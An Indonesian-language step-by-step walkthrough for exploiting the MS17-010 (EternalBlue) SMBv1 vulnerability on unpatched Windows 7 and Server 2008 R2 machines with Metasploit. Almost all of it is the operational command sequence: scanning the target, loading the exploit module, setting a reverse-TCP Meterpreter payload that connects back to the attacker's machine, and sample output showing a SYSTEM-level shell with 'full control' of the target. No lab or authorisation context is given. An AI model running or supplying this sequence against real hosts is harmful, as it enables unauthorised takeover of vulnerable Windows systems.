# Walkthrough: Eksploitasi MS17-010 (EternalBlue)

Dokumen ini menjelaskan langkah-langkah untuk mengeksploitasi kerentanan SMBv1 pada sistem Windows menggunakan modul EternalBlue di Metasploit.

**Target**: Mesin Windows 7 / Windows Server 2008 R2 (tanpa patch keamanan MS17-010)
**Tujuan**: Mendapatkan akses shell Meterpreter dengan hak akses SYSTEM.

---

### Tahap 1: Persiapan dan Pengecekan

Pastikan Anda berada di jaringan yang sama dengan target. Pertama, kita akan memverifikasi apakah target rentan menggunakan modul *scanner* auxiliary.

1.  **Jalankan Metasploit**
    ```bash
    msfconsole
    ```

2.  **Cari dan Gunakan Modul Scanner**
    ```
    msf6 > search ms17-010
    msf6 > use auxiliary/scanner/smb/smb_ms17_010
    ```

3.  **Atur Opsi**
    Ganti `192.168.1.10` dengan IP address target Anda.
    ```
    msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.10
    msf6 auxiliary(scanner/smb/smb_ms17_010) > run
    ```

4.  **Analisis Hasil**
    Jika output menunjukkan `Host is likely VULNERABLE to MS17-010`, Anda bisa melanjutkan ke tahap eksploitasi.

### Tahap 2: Eksploitasi

Sekarang kita akan menggunakan modul exploit untuk mendapatkan akses.

1.  **Gunakan Modul Exploit**
    ```
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    ```

2.  **Lihat Opsi yang Diperlukan**
    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
    ```
    Kita perlu mengatur `RHOSTS` dan `LHOST`.

3.  **Atur Opsi Exploit**
    * `RHOSTS`: IP address mesin target.
    * `LHOST`: IP address mesin Anda (mesin penyerang).
    * `PAYLOAD`: Kita akan menggunakan Meterpreter reverse TCP 64-bit.

    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.10.1
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    ```

4.  **Jalankan Exploit**
    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
    ```

### Tahap 3: Pasca-Eksploitasi

Jika berhasil, Anda akan melihat pesan `WIN` dan sesi Meterpreter akan terbuka.

[] Sending encoded stage (206403 bytes) to 192.168.1.10
[] Meterpreter session 1 opened (10.10.10.1:4444 -> 192.168.1.10:49157) at ...

meterpreter >


Anda sekarang memiliki kontrol penuh atas mesin target. Verifikasi hak akses Anda:
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


**Walkthrough selesai.**
